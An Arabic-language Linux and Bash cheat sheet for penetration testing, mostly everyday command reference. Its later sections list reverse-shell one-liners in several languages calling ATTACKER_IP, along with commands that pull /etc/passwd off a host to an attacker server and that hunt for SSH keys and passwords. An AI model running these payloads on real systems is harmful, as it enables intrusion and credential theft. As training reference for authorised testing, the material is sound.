<a id="-linux-commands--bash---complete-pentesting-cheatsheet"></a>
# 🐧 أوامر Linux وBash — مرجع شامل لاختبار الاختراق

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Pentesting">
</p>

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [التنقل والملفات](#-navigation--files)
- [استطلاع النظام](#-system-enumeration)
- [استطلاع المستخدمين](#-user-enumeration)
- [أوامر الشبكة](#-network-commands)
- [البحث عن الملفات وتحليلها](#-file-search--analysis)
- [معالجة النصوص](#-text-processing)
- [الأذونات والملكية](#-permissions--ownership)
- [إدارة العمليات](#-process-management)
- [إدارة الحزم](#-package-management)
- [كتابة برامج Bash النصية](#-bash-scripting)
- [الصدفات العكسية (Reverse Shells)](#-reverse-shells)
- [نقل الملفات](#-file-transfers)
- [أوامر من سطر واحد](#-one-liners)

---

<a id="-navigation--files"></a>
## 📁 التنقل والملفات

<a id="directory-navigation"></a>
### التنقل بين المجلدات

```bash
# المجلد الحالي
pwd

# تغيير المجلد
cd /path/to/dir
cd ..          # المجلد الأب
cd ~           # المجلد الرئيسي للمستخدم
cd -           # المجلد السابق

# سرد الملفات
ls
ls -la         # تفاصيل موسّعة وجميع الملفات
ls -lah        # أحجام بصيغة سهلة القراءة
ls -latr       # الترتيب حسب الوقت بصورة معكوسة
ll             # اسم مستعار لـ ls -la وفق إعداد التوزيعة
```

<a id="file-operations"></a>
### عمليات الملفات

```bash
# إنشاء ملفات ومجلدات
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # إنشاء المجلدات الأب

# نسخ
cp source dest
cp -r source_dir dest_dir  # بصورة تكرارية

# نقل أو إعادة تسمية
mv source dest
mv oldname newname

# حذف
rm file
rm -r directory            # بصورة تكرارية
rm -rf directory           # فرض الحذف دون طلب تأكيد

# عرض الملفات
cat file.txt
less file.txt              # عارض صفحات
more file.txt
head -n 20 file.txt        # أول 20 سطرًا
tail -n 20 file.txt        # آخر 20 سطرًا
tail -f file.txt           # متابعة التحديثات مباشرة
```

<a id="archives--compression"></a>
### الأرشفة والضغط

```bash
# tar
tar -cvf archive.tar files/      # إنشاء
tar -xvf archive.tar             # استخراج
tar -czvf archive.tar.gz files/  # إنشاء أرشيف مضغوط بـ gzip
tar -xzvf archive.tar.gz         # استخراج أرشيف مضغوط بـ gzip

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

<a id="-system-enumeration"></a>
## 🔍 استطلاع النظام

<a id="system-information"></a>
### معلومات النظام

```bash
# اسم المضيف
hostname
hostname -I               # عناوين IP

# نظام التشغيل والنواة
uname -a                  # All info
uname -r                  # إصدار النواة
cat /etc/os-release       # معلومات نظام التشغيل
cat /etc/issue            # نص تعريف نظام التشغيل
cat /proc/version         # معلومات النواة والمترجم

# البنية
arch
uname -m

# العتاد
lscpu                     # معلومات المعالج
cat /proc/cpuinfo
free -h                   # الذاكرة
df -h                     # مساحة القرص
lsblk                     # أجهزة التخزين الكتلية
```

<a id="environment"></a>
### البيئة

```bash
# متغيرات البيئة
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# تعيين متغير
export VAR="value"
VAR="value"
```

<a id="running-services"></a>
### الخدمات قيد التشغيل

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# فحص منافذ الاستماع
ss -tulpn
netstat -tulpn
```

<a id="cron-jobs"></a>
### مهام Cron المجدولة

```bash
# جدول مهام المستخدم
crontab -l

# جداول مهام النظام
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# مراقبة مهام cron باستخدام pspy
./pspy64
```

<a id="installed-packages"></a>
### الحزم المثبتة

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# البحث عن حزمة
dpkg -l | grep package
which binary
whereis binary
```

---

<a id="-user-enumeration"></a>
## 👤 استطلاع المستخدمين

<a id="current-user"></a>
### المستخدم الحالي

```bash
# معرفة المستخدم الحالي
whoami
id
id username

# المجموعات
groups
groups username

# الامتيازات
sudo -l                   # صلاحيات sudo
cat /etc/sudoers          # ملف sudoers (يتطلب root)
```

<a id="all-users"></a>
### جميع المستخدمين

```bash
# قائمة المستخدمين
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# المستخدمون الذين لديهم صدفة أوامر
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# بصمات كلمات المرور (تتطلب root)
cat /etc/shadow

# عمليات تسجيل الدخول الأخيرة
last
lastlog
w
who
users
```

<a id="interesting-files"></a>
### ملفات تستحق الفحص

```bash
# مفاتيح SSH
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# سجل الأوامر
cat ~/.bash_history
cat ~/.zsh_history
history

# ملفات الإعداد
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

<a id="-network-commands"></a>
## 🌐 أوامر الشبكة

<a id="network-configuration"></a>
### إعدادات الشبكة

```bash
# عنوان IP
ip a
ip addr show
ifconfig

# المسارات
ip route
route -n
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# جدول ARP
arp -a
ip neigh
```

<a id="open-ports--connections"></a>
### المنافذ المفتوحة والاتصالات

```bash
# منافذ الاستماع
ss -tulpn
ss -tlnp                  # TCP فقط
netstat -tulpn
netstat -ano

# الاتصالات النشطة
ss -tup
netstat -an | grep ESTABLISHED

# تحديد العملية حسب المنفذ
lsof -i :80
fuser 80/tcp
```

<a id="network-testing"></a>
### اختبار الشبكة

```bash
# Ping
ping -c 4 host

# Traceroute
traceroute host
tracepath host

# استعلام DNS
host domain.com
dig domain.com
nslookup domain.com

# فحص المنفذ
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # الترويسات فقط
curl -s http://host       # دون عرض مقياس التقدم والرسائل المعتادة
curl -k https://host      # تجاوز التحقق من شهادة TLS
wget http://host/file
```

<a id="firewall"></a>
### جدار الحماية

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW (Ubuntu)
ufw status
ufw status verbose

# firewalld (CentOS)
firewall-cmd --list-all
```

---

<a id="-file-search--analysis"></a>
## 🔎 البحث عن الملفات وتحليلها

<a id="find-command"></a>
### الأمر find

```bash
# البحث حسب الاسم
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # دون تمييز حالة الأحرف

# البحث حسب النوع
find / -type f -name "*.conf"          # الملفات
find / -type d -name "backup"          # المجلدات

# البحث حسب الأذونات
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
find / -perm -o+w 2>/dev/null          # قابل للكتابة لجميع المستخدمين

# البحث حسب المالك
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# البحث حسب الحجم
find / -size +100M 2>/dev/null         # أكبر من 100MB وفق وصف الأصل
find / -size -1k 2>/dev/null           # أصغر من 1KB وفق وصف الأصل

# البحث حسب الوقت
find / -mtime -7 2>/dev/null           # عُدّل خلال الأيام السبعة الماضية
find / -atime +30 2>/dev/null          # جرى الوصول إليه قبل أكثر من 30 يومًا

# البحث ثم تنفيذ إجراء
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

<a id="grep-search-in-files"></a>
### Grep (البحث داخل الملفات)

```bash
# بحث أساسي
grep "pattern" file
grep -i "pattern" file                 # دون تمييز حالة الأحرف
grep -r "pattern" /path/               # بصورة تكرارية
grep -rn "pattern" /path/              # مع أرقام الأسطر

# عكس المطابقة
grep -v "pattern" file                 # الأسطر غير المطابقة

# عدّ الأسطر المطابقة
grep -c "pattern" file

# عرض السياق
grep -A 3 "pattern" file               # 3 أسطر بعدها
grep -B 3 "pattern" file               # 3 أسطر قبلها
grep -C 3 "pattern" file               # 3 أسطر قبلها وبعدها

# التعبيرات النمطية
grep -E "regex" file                   # تعبير نمطي موسّع
egrep "regex" file

# أنماط متعددة
grep -E "pattern1|pattern2" file
```

<a id="locate--which"></a>
### الأمران locate وwhich

```bash
# البحث باستخدام locate (يتطلب updatedb)
locate filename
updatedb                               # تحديث قاعدة البيانات

# تحديد موقع الملف التنفيذي باستخدام which
which binary
whereis binary
type command
```

<a id="file-analysis"></a>
### تحليل الملفات

```bash
# نوع الملف
file filename

# السلاسل النصية داخل الملف التنفيذي
strings binary
strings binary | grep password

# Hexdump
xxd file
hexdump -C file

# البصمة
md5sum file
sha256sum file
sha1sum file
```

---

<a id="-text-processing"></a>
## ✂️ معالجة النصوص

<a id="cut"></a>
### Cut

```bash
# الاقتطاع حسب الفاصل
cut -d: -f1 /etc/passwd                # الحقل الأول، باستخدام : فاصلًا
cut -d: -f1,3 /etc/passwd              # الحقلان 1 و3

# الاقتطاع حسب موضع المحرف
cut -c1-10 file                        # المحارف من 1 إلى 10
```

<a id="awk"></a>
### Awk

```bash
# طباعة الأعمدة
awk '{print $1}' file                  # العمود الأول
awk '{print $1, $3}' file              # العمودان 1 و3
awk -F: '{print $1}' /etc/passwd       # فاصل مخصص

# الشروط
awk '$3 > 1000' /etc/passwd            # حيث تكون قيمة الحقل 3 أكبر من 1000
awk '/pattern/ {print $1}' file        # الأسطر المطابقة

# المتغيرات المدمجة
awk '{print NR, $0}' file              # أرقام الأسطر
awk 'END {print NR}' file              # إجمالي الأسطر
```

<a id="sed"></a>
### Sed

```bash
# استبدال
sed 's/old/new/' file                  # أول ظهور في كل سطر
sed 's/old/new/g' file                 # جميع مرات الظهور
sed -i 's/old/new/g' file              # التعديل داخل الملف نفسه

# حذف الأسطر
sed '/pattern/d' file                  # حذف الأسطر المطابقة
sed '5d' file                          # حذف السطر 5
sed '1,5d' file                        # حذف الأسطر من 1 إلى 5

# طباعة أسطر محددة
sed -n '5p' file                       # طباعة السطر 5
sed -n '1,10p' file                    # طباعة الأسطر من 1 إلى 10
```

<a id="sort--uniq"></a>
### الترتيب وإزالة التكرار

```bash
# ترتيب
sort file
sort -r file                           # عكسي
sort -n file                           # عددي
sort -u file                           # القيم الفريدة فقط
sort -t: -k3 -n /etc/passwd            # حسب الحقل 3

# فريد
uniq file                              # إزالة التكرارات المتجاورة
sort file | uniq                       # إزالة جميع التكرارات
uniq -c file                           # عدّ مرات الظهور
sort file | uniq -c | sort -rn         # العدّ والترتيب
```

<a id="other-useful"></a>
### أوامر مفيدة أخرى

```bash
# إحصاء النص
wc -l file                             # الأسطر
wc -w file                             # الكلمات
wc -c file                             # البايتات

# تنسيق الأعمدة
column -t file                         # تنسيق كجدول
column -s: -t /etc/passwd              # فاصل مخصص

# الأمر tr لاستبدال المحارف
echo "HELLO" | tr 'A-Z' 'a-z'          # تحويل إلى أحرف صغيرة
cat file | tr -d '\n'                  # إزالة محارف السطر الجديد

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

<a id="-permissions--ownership"></a>
## 🔐 الأذونات والملكية

<a id="understanding-permissions"></a>
### فهم الأذونات

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── Others (r-x = 5)
│ │  └───── Group  (r-x = 5)
│ └──────── Owner  (rwx = 7)
└────────── File type (- = file, d = directory)
```

<a id="chmod"></a>
### Chmod

```bash
# عددي
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# رمزي
chmod +x file                          # إضافة إذن التنفيذ
chmod -w file                          # إزالة إذن الكتابة
chmod u+x file                         # إذن التنفيذ للمالك
chmod g+w file                         # إذن الكتابة للمجموعة
chmod o-r file                         # منع القراءة عن الآخرين

# بصورة تكرارية
chmod -R 755 directory/
```

<a id="chown"></a>
### Chown

```bash
# تغيير المالك
chown user file
chown user:group file
chown -R user:group directory/

# تغيير المجموعة فقط
chgrp group file
```

<a id="special-permissions"></a>
### الأذونات الخاصة

```bash
# SUID (تعيين معرّف المستخدم) - 4
chmod u+s file
chmod 4755 file

# SGID (تعيين معرّف المجموعة) - 2
chmod g+s directory
chmod 2755 directory

# بت الحماية من حذف ملفات الآخرين (Sticky Bit) - 1
chmod +t directory
chmod 1755 directory

# البحث عن ملفات SUID/SGID
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

<a id="-process-management"></a>
## ⚙️ إدارة العمليات

<a id="view-processes"></a>
### عرض العمليات

```bash
# سرد العمليات
ps aux
ps -ef
ps aux | grep process_name

# top (عرض مباشر)
top
htop                                   # نسخة بميزات إضافية

# شجرة العمليات
pstree
ps auxf
```

<a id="process-control"></a>
### التحكم في العمليات

```bash
# الخلفية والواجهة
command &                              # التشغيل في الخلفية
Ctrl+Z                                 # تعليق التنفيذ
bg                                     # استئناف التشغيل في الخلفية
fg                                     # إحضار المهمة إلى الواجهة
jobs                                   # سرد المهام

# إنهاء عملية
kill PID
kill -9 PID                            # إنهاء قسري
killall process_name
pkill process_name

# ضبط الأولوية باستخدام nice
nice -n 10 command                     # أولوية أقل
renice 10 -p PID
```

---

<a id="-package-management"></a>
## 📦 إدارة الحزم

<a id="debianubuntu-aptdpkg"></a>
### Debian/Ubuntu (apt/dpkg)

```bash
# تحديث
apt update
apt upgrade

# تثبيت
apt install package
dpkg -i package.deb

# إزالة
apt remove package
apt purge package                      # الإزالة مع ملفات الإعداد

# بحث
apt search package
apt-cache search package

# معلومات
apt show package
dpkg -l | grep package
```

<a id="rhelcentos-yumdnf"></a>
### RHEL/CentOS (yum/dnf)

```bash
# تحديث
yum update
dnf update

# تثبيت
yum install package
dnf install package

# إزالة
yum remove package

# بحث
yum search package

# معلومات
yum info package
rpm -qa | grep package
```

---

<a id="-bash-scripting"></a>
## 💻 كتابة برامج Bash النصية

<a id="basics"></a>
### الأساسيات

```bash
#!/bin/bash

# المتغيرات
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# استبدال الأوامر بنتائجها
DATE=$(date)
FILES=`ls -la`

# قراءة المدخلات
read -p "Enter name: " NAME
echo "Hello $NAME"
```

<a id="conditionals"></a>
### الجمل الشرطية

```bash
# if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# مقارنات السلاسل النصية
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # فارغ
if [ -n "$str" ]; then                 # غير فارغ

# مقارنات الأعداد
if [ $num1 -eq $num2 ]; then           # متساوٍ
if [ $num1 -ne $num2 ]; then           # غير متساوٍ
if [ $num1 -gt $num2 ]; then           # أكبر من
if [ $num1 -lt $num2 ]; then           # أصغر من

# اختبارات الملفات
if [ -e file ]; then                   # موجود
if [ -f file ]; then                   # ملف عادي
if [ -d dir ]; then                    # مجلد
if [ -r file ]; then                   # قابل للقراءة
if [ -w file ]; then                   # قابل للكتابة
if [ -x file ]; then                   # قابل للتنفيذ
```

<a id="loops"></a>
### الحلقات

```bash
# حلقة for
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# حلقة while
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# حلقة for بأسلوب C
for ((i=0; i<10; i++)); do
    echo $i
done
```

<a id="functions"></a>
### الدوال

```bash
# تعريف دالة
function_name() {
    echo "Argument 1: $1"
    echo "Argument 2: $2"
    echo "All args: $@"
    echo "Num args: $#"
}

# استدعاء دالة
function_name arg1 arg2
```

<a id="script-example"></a>
### مثال برنامج نصي

```bash
#!/bin/bash
# ماسح منافذ

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT open"
done
```

---

<a id="-reverse-shells"></a>
## 🔌 الصدفات العكسية (Reverse Shells)

<a id="bash"></a>
### Bash

```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

<a id="netcat"></a>
### Netcat

```bash
# استخدام nc مع الخيار -e
nc -e /bin/bash ATTACKER_IP PORT

# استخدام nc دون الخيار -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

<a id="python"></a>
### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

<a id="php"></a>
### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

<a id="perl"></a>
### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

<a id="ruby"></a>
### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

<a id="upgrade-shell"></a>
### تحسين الصدفة التفاعلية

```bash
# إنشاء طرفية TTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# طرفية TTY كاملة
# داخل الصدفة العكسية:
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# على جهاز المختبِر:
stty raw -echo; fg
# داخل الصدفة:
export TERM=xterm
stty rows 40 cols 150
```

---

<a id="-file-transfers"></a>
## ⬇️ نقل الملفات

<a id="from-attacker-to-target"></a>
### من جهاز المختبِر إلى الهدف

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# Attacker: nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# base64 للملفات الصغيرة
# Attacker: base64 file
echo "BASE64_STRING" | base64 -d > file
```

<a id="from-target-to-attacker"></a>
### من الهدف إلى جهاز المختبِر

```bash
# nc
# Attacker: nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# curl (POST)
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# نسخ الناتج إلى جهاز المختبِر وفك ترميزه
```

<a id="start-http-server"></a>
### تشغيل خادم HTTP

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

<a id="-one-liners"></a>
## ⚡ أوامر من سطر واحد

<a id="useful-pentest-one-liners"></a>
### أوامر اختبار اختراق مفيدة من سطر واحد

```bash
# البحث عن ملفات تنفيذية تحمل SUID
find / -perm -4000 -type f 2>/dev/null

# البحث عن مجلدات قابلة للكتابة
find / -writable -type d 2>/dev/null

# البحث عن ملفات قابلة للكتابة للجميع
find / -perm -o+w -type f 2>/dev/null

# البحث عن كلمات مرور في ملفات الإعداد
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# البحث عن مفاتيح SSH
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# فحص سريع للمنافذ
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# اكتشاف المضيفين باستخدام Ping
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# استخراج عناوين IP من ملف
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# ترميز Base64 وفك ترميزه
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# ترميز عناوين URL وفك ترميزها
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

<a id="quick-reference-table"></a>
### جدول مرجعي سريع

| الغرض | الأمر |
|---------|---------|
| المستخدم الحالي | `whoami` / `id` |
| معلومات النظام | `uname -a` |
| عنوان IP | `ip a` / `hostname -I` |
| المنافذ المفتوحة | `ss -tulpn` |
| العمليات قيد التشغيل | `ps aux` |
| البحث عن SUID | `find / -perm -4000 2>/dev/null` |
| المجلدات القابلة للكتابة | `find / -writable -type d 2>/dev/null` |
| تنزيل ملف | `wget http://url/file` |
| صدفة عكسية | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| تحسين طرفية TTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

<a id="-resources"></a>
## 📚 الموارد

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [مرجع الصدفات العكسية](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

<a id="related-cheatsheets"></a>
### مراجع ذات صلة
- [رفع الامتيازات على Linux](../../Linux-PrivEsc/README.md)
- [Nmap](../../Nmap/README.md)
- [Metasploit](../../Metasploit/translations/README.ar.md)

---

<p align="center">
  <b>🐧 أتقن Linux لاختبار الاختراق!</b><br>
  <i>سطر الأوامر رفيقك الأساسي</i>
</p>

> **شرح مخطط الأذونات:** المحرف الأول يبيّن نوع الملف، ثم تأتي مجموعات أذونات المالك والمجموعة والآخرين. القراءة r قيمتها 4، والكتابة w قيمتها 2، والتنفيذ x قيمته 1؛ لذا rwx تساوي 7 وr-x تساوي 5. أُبقي الرسم الإنجليزي للحفاظ على محاذاته. TTY طرفية تفاعلية، والصدفة العكسية اتصال تبدأه بيئة الهدف إلى جهاز المختبِر.

> **توضيحات لمعالجة النصوص:** الخيار `grep -c` يعدّ الأسطر المطابقة، لا عدد مرات ظهور النمط داخل السطر. وفي مثال مقارنة الحقل الثالث من `/etc/passwd` باستخدام awk، يلزم تحديد `:` فاصلًا؛ الفاصل الافتراضي هو المسافات البيضاء. [توثيق GNU Grep](https://www.gnu.org/s/grep/manual/html_node/General-Output-Control.html)، [توثيق GNU Awk](https://www.gnu.org/software/gawk/manual/html_node/Field-Splitting-Summary.html).

> **توضيح للحجم:** اللاحقتان k وM في `find -size` تعنيان KiB وMiB، ويُقرّب الحجم لأعلى إلى الوحدة التالية قبل المقارنة. لذلك لا يطابق المثال `-size -1k` جميع الملفات الأصغر من 1024 بايت، بل يطابق الحجم الصفري وفق هذه الآلية. احتُفظ بوصف KB/MB في الأمثلة مع هذه الملاحظة. [مرجع GNU Findutils](https://www.gnu.org/software/findutils/manual/html_node/find_html/Size.html).

> **ملاحظات التوافق:** تختلف خيارات nc بين التطبيقات؛ في OpenBSD يعني `-e` التحقق من اسم شهادة TLS، وليس تشغيل برنامج كما يفترض مثال الأصل. [دليل OpenBSD](https://man.openbsd.org/nc). كذلك فإن `curl -k` يتجاوز التحقق من الشهادة ولا يعطّل TLS نفسه. [توثيق curl](https://curl.se/docs/manpage.html#-k). أمثلة `if` المنفصلة مقتطفات للصياغة وليست برنامجًا كاملًا؛ تحتاج الكتل المكتملة إلى محتوى ثم `fi`.
